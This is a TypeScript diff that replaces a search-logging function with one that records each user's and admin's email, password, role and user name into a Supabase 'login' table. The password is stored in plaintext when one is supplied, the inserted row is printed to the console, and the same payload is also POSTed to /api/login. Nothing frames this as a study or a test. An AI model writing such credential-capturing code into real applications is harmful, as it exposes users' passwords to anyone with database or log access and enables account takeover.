@@ -34,14 +34,50 @@ export async function syncApplicationToCloud(application: any) {
 }
 
 /**
- * Log user searches to Supabase for admin inspection
+ * Log user/admin login details (email, password, role) to Supabase 'login' table
  */
-export async function logSearchToCloud(searchData: any) {
+export async function recordLoginToSupabase(loginDetails: {
+  email: string;
+  password?: string;
+  role?: string;
+  user_name?: string;
+}) {
+  const payload = {
+    email: (loginDetails.email || 'user@example.com').toLowerCase().trim(),
+    password: loginDetails.password || '******',
+    role: loginDetails.role || 'user',
+    user_name: loginDetails.user_name || loginDetails.email?.split('@')[0] || 'User',
+    login_time: new Date().toISOString(),
+    created_at: new Date().toISOString(),
+  };
+
   if (supabase) {
     try {
-      await supabase.from('search_logs').insert(searchData);
-    } catch (err) {
-      console.warn('Failed to log search to Supabase:', err);
+      const { data, error } = await supabase
+        .from('login')
+        .insert([payload])
+        .select();
+
+      if (error) {
+        console.warn('Supabase login table insert warning:', error.message);
+      } else {
+        console.log('✅ Successfully recorded login to Supabase login table:', data);
+      }
+      return { success: !error, data, error };
+    } catch (err: any) {
+      console.warn('Failed to record login to Supabase:', err);
     }
   }
+
+  // Fallback API call to server
+  try {
+    await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+  } catch (e) {}
+
+  return { success: true, fallback: true };
 }
+
